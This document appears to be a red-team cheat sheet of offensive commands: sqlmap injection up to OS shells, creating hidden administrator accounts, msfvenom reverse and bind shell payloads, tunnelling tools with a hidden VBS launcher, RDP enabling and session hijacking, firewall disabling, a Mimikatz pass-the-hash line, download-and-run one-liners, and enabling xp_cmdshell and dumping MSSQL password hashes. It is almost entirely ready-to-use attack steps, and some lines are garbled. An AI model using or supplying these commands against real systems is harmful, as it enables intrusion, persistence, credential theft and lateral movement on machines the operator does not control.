# SQLMAP
sqlmap inject
```
sqlmap -u "http://<target>/index.php?id=1" --technique U   //UNION-based
sqlmap -u "http://<target>/index.php?id=1" --technique T   //Time-based
sqlmap -u "http://<target>/index.php?id=1" --technique B   //Boolean-based
sqlmap -u "http://<target>/index.php?id=1" --technique S   //Stacked queries-based
sqlmap -u "http://<target>/index.php?id=1" --technique E   //Error-based
```
sqlmap list database
```
sqlmap -u "http://<target>/index.php?id=1" --dbs
```
sqlmap list tables
```
sqlmap -u "http://<target>/index.php?id=1" -D "database" --tables
```
sqlmap list columns
```
sqlmap -u "http://<target>/index.php?id=1" -D "database" -T "tables" --columns
```
sqlmap check DBA
```
sqlmap -u "http://<target>/index.php?id=1" --is-dba
```
sqlmap list now user
```
sqlmap -u "http://<target>/index.php?id=1" --current-user
```
sqlmap list now db
```
sqlmap -u "http://<target>/index.php?id=1" --current-db
```
sqlmap sqlshell
```
sqlmap -u "http://<target>/index.php?id=1" --sql-shell
select @@datadir;
select @@basedir;
select @@plugin_dir;
select @@version;
select host_name();        //same, web&databse on server
select @@servername;  //same, web&databse on server
```
sqlmap oscmd
```
sqlmap -u "http://<target>/index.php?id=1" --os-cmd="whoami"
```
sqlmap osshell
```
sqlmap -u "http://<target>/index.php?id=1" --os-shell
```
sqlmap defalut run
```
sqlmap -u "http://<target>/index.php?id=1" --batch
```
sqlmap https
```
sqlmap -u "http://<target>/index.php?id=1" --force-ssl
```
MYSQL secure_file_priv=null
```
sqlmap -u "http://<target>/index.php?id=1" --sql-shell
show global variables like '%secure%';
select @@secure;

my.ini
secure_file_priv=C:/
```
# USER
list user
```
net user
```
delete user
```
net user user /delete
```
change user new pass
```
net user user pass
```
add user
```
net user user pass /add
```
Add user to Administrators group
```
net localgroup "Administrators" user /add
```
mstsc Force login
```
mstsc /v:IP:PORT /user
```
CS argue add user
```
argue net saldjfoiwjeofijoisfklasjdlfjasdfiowjefoijwoefjoaisjefojsaefoiwejfowef
run net user test 123456 /add
run net localgroup "administrators" test /add
```
add hide user
```
net user test$ 123456 /add
net localgroup administrators test$ /add
net user test$ /active:yes
```
del hide user
```
net user test$ /del
```
# Windows
check defender task
```
tasklist
```
list user
```
net user
```
displays current user
```
whoami
```
displays systeminfo
```
systeminfo
```
displays x86/x64
```
wmic os get osarchitecture
```
displays all current network
```
ipconfig /all
```
check network
```
ping example.com -n 3 > 1.txt
```
Displays all user sessions
```
query user || qwinsta
```
Displays IP
```
arp –a
```
Displays all wireless network
```
netsh wlan show profiles
```
List recently opened files
```
dir %APPDATA%\Microsoft\Windows\Recent
```

# Linux
Kernel info
```
uname -a
uname -srm
```
Kernel version
```
cat /proc/version
```
Distribution
```
cat /etc/issue
cat /etc/redhat-release
lsb_release -a
```
CPU info
```
cat /proc/cpuinfo
lscpu
```
os name
```
hostname
```

# Reverse beacon
```
TeamServer(ip,port) <---- TargetServer
```

# Forward beacon
```
TeamServer ----> TargetServer(ip,port)
```

# Metasploit

## Reverse
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe > reverse.exe
```

## Reverse handler
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST
set LPORT
exploit
```

## Forward
```
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT= -f exe > tcp.exe
```

## Forward handler
```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set LPORT
set RHOST
exploit
```

# Targetserver Not Out Of The Net

## pystinger
https://github.com/FunnyWolf/pystinger
```
// Windows
Targetserver:
proxy.* -> targetserver
stinger_server.exe -> targetserver

create stinger_server.vbs:
Set ws = CreateObject("Wscript.Shell")
ws.run "cmd /c D:\XXXXX\stinger_server.exe 0.0.0.0",vbhide

stinger_server.vbs
// Linux
Targetserver:
proxy.* -> targetserver
stinger_server -> targetserver
```
```
Teamserver:
./stinger_client -w http://x.x.x.x/proxy.* -l 0.0.0.0 -p 60000

cobaltstrike new beacon listen:
HTTP Hosts: targetserver intranet ip
HTTP Port: 60020
```
## Neo-reGeorg
https://github.com/L-codes/Neo-reGeorg
```
python neoreg.py generate -k password
python neoreg.py -k password -u http://xx/tunnel.php -l 0.0.0.0 -p 4444
Starting SOCKS5 server [0.0.0.0:4444]
```
# RDP
check rdp status 0x0:ON 0x1:OFF
```
REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
```
0xd3d 3389
```
REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds" /v  PortNumber
REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
```
tasklist,netstat
```
tasklist /svc | findstr "TermService"
netstat -ano | findstr "3389"
```
REG open rdp 0:ON 1:OFF
```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
REG close rdp 0:ON 1:OFF
```
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```
modify 3389to3000
```
REG ADD "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "PortNumber" /t REG_DWORD /d 3000 /f
```

WMIC open rdp (must winmgmt service start)
```
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```
MSSQL xp_regwrite open rdp(xp_cmdshell disabled/delete)
xp_regread check rdp
```
exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server' ,'fDenyTSConnections'
```
xp_regread search rdp port
```
exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber'
```
xp_regwrite open rdp 0:ON 1:OFF
```
exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;
```
firewall allows rdp add rule
```
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
```
firewall close disable
```
netsh firewall set opmode mode=disable
```
Displays all user sessions
```
query user
```
switch user sessions
```
tscon sessionID /PASSWORD:userpass
example: tscon 2 /PASSWORD:test123
```
Hijack users
```
sc create rdp binpath= "cmd.exe /k tscon sessionID /dest:sessionName"
example: sc create rdp binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#4"
sc start rdp
```

Pass The Hash(admin workgroup)
REG open Restricted Admin Mode
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
check status
REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"
Mimikatz PTH
privilege:\:debugsekurlsa\::pth /user:administrator /domain:whoamianony.org /ntlm:ab89b1295e69d353dd7614c7a3a80cec "/run:mstsc.exe /restrictedadmin"

https://www.revshells.com/

# DOMAIN CONTROLLERS
search domain list
```
net view /domain
```
search domainuser
```
net user /domain
```
search domaingroup
```
net group /domain
```
search domainhost
```
net group "domain xxx" /domain
```
search domainadmin
```
net group "domain admins" /domain
```
search domaincontrol
```
net group "domain controllers" /domain
```
search enterpriseadmin
```
net group "enterprise admins" /domain
```
search dns
```
nslookup
```
# PAYLOAD DOWN
certutil download
```
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe C:\7zip.exe
```
certutil cache
```
certutil.exe -urlcache *
```
certutil cache delete
```
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe delete
```
powershell
```
powershell (new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','C:\7zip.exe')

powershell (new-object System.Net.WebClient).DownloadFile('http://7-zip.org/a/7z1604-x64.exe','C:\7zip.exe');start-process 'C:\7zip.exe'
```
bitsadmin download
```
bitsadmin /transfer "test" http://7-zip.org/a/7z1604-x64.exe C:\7zip.exe

bitsadmin /transfer n http://7-zip.org/a/7z1604-x64.exe C:\7zip.exe
```
# Microsoft SQL Server
check xp_cmdshell
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```
restore xp_cmdshell
```
exec sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll';
```
delete xp_cmdshell
```
exec sp_dropextendedproc 'xplog70.dll';
```
open xp_cmdshell
```
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```
```
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell';EXEC master..sp_configure 'SHOW advanced options',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'xp_cmdshell',1; RECONFIGURE WITH OVERRIDE; EXEC master..sp_configure 'SHOW advanced options',0; RECONFIGURE WITH OVERRIDE--
```
close xp_cmdshell
```
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',0;
RECONFIGURE;
```
check SA
```
select is_srvrolemember('sysadmin')
```
check db_owner
```
select is_member('db_owner')
```
check public
```
select is_srvrolemember('public')
```
displays connect user
```
SELECT ORIGINAL_LOGIN(),APP_NAME(), CONNECTIONPROPERTY('CLIENT_NET_ADDRESS') , CONNECTIONPROPERTY('PROTOCOL_TYPE')
```
displays all database name
```
select name from master.dbo.sysdatabases;
```
displays user hash
```
select name,sys.fn_varbintohexstr(password_hash) from sys.sql_logins
```
displays database user pass
```
select name,sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins;
```